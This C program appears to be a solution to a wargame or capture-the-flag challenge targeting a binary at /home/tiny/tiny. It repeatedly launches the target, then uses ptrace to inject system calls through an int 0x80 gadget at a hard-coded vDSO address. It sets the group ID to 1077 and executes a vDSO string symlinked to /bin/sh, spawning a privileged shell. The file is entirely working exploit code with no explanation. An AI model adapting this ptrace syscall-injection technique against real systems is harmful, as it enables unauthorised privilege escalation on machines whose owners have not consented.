#include <stdlib.h>
#define __GNU_SOURCE__
#undef __x86_64__

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <unistd.h>

#define VDSO_BASE (0xf773b000L)

// "sym\0" at VDSO, ln -sf /bin/sh sym
const uint32_t STR_ADDR = VDSO_BASE + 0xbe9;

// b36:	cd 80                	int    $0x80
//  b38:	90                   	nop
//  b39:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
const uint32_t INT80_ADDR = VDSO_BASE + 0xb57;

const uint32_t dummy = 0;

const char* _argv[] = {(char*)&INT80_ADDR, "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", 0};

int wait_child(pid_t pid) {
    int status;
    waitpid(pid, &status, 0);
    if (WIFSTOPPED(status)) {
        printf(
            "child[%d]: stopped by delivery of the signal[%d]: %s\n", 
            pid,
            WSTOPSIG(status),
            strsignal(WSTOPSIG(status))
        );
        return 0;
    }
    if (WIFSIGNALED(status)) {
        printf(
            "child[%d]: terminated by the signal[%d]: %s\n", 
            pid, 
            WTERMSIG(status),
            strsignal(WTERMSIG(status))
        );
        return 1;
    }
    if (WIFEXITED(status)) {
        printf("child[%d]: terminated  normally\n", pid);
        return 1;
    }
    return 0;
}

int pt_syscall(pid_t pid, int sysno, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {
    struct user_regs_struct regs = {0};
    if (0 > ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
        perror("ptrace get regs failed.");
        return -1;
    }
    regs.eax = sysno;
    regs.ebx = arg0;
    regs.ecx = arg1;
    regs.edx = arg2;
    regs.esi = arg3;
    regs.edi = arg4;
    regs.ebp = arg5;
    regs.eip = INT80_ADDR;

    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    printf("eip:%p, eax:%#x\n", regs.eip, regs.eax);
    return regs.eax;
}

void ptsys_setregid(pid_t pid) {
    puts("setregid");
    pt_syscall(pid, SYS_setregid, 1077, 1077, 0, 0, 0, 0);
}

void ptsys_setresgid(pid_t pid) {
    puts("setresgid");
    pt_syscall(pid, SYS_setresgid, 1077, 1077, 1077, 0, 0, 0);
}

void ptsys_getgid(pid_t pid) {
    puts("getgid");
    gid_t gid = pt_syscall(pid, SYS_getgid, 0, 0, 0, 0, 0, 0);
    printf("gid: %d\n", gid);
}

void ptsys_getegid(pid_t pid) {
    puts("getegid");
    gid_t egid = pt_syscall(pid, SYS_getgid, 0, 0, 0, 0, 0, 0);
    printf("egid: %d\n", egid);
}

void ptsys_execve(pid_t pid) {
    puts("execve");
    pt_syscall(pid, SYS_execve, STR_ADDR, 0, 0, 0, 0, 0);
}

int main(int argc, char** argv, char** envp) {
    struct user_regs_struct regs = {0};
    int status;

    while (1) {
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork failed.");
            exit(-1);
        } if (pid) {
            if (wait_child(pid)) {
                continue;
            }
            if (-1 == ptrace(PTRACE_GETREGS, pid, 0, &regs)) {
                continue;
            }
            printf("eip:%p, eax:%#x\n", regs.eip, regs.eax);
            ptsys_setresgid(pid);
            //ptsys_setregid(pid);
            ptsys_getgid(pid);
            ptsys_getegid(pid);
            ptsys_execve(pid);
            if (0 > ptrace(PTRACE_DETACH, pid)) {
                perror("ptrace detach failed.");
            }
            //ptrace(PTRACE_CONT, pid, 0, 0);
            // waitpid(pid, &status, 0);
            wait_child(pid);
//            while (1) {
//                waitpid(pid, &status, 0);
//               if (WIFEXITED(status)) {
//                    break;
//                }
//            }
            _exit(0);
            // pause();
        } else {
            execve("/home/tiny/tiny", _argv, envp);
            perror("execve");
        }
    }
    return 0;
}
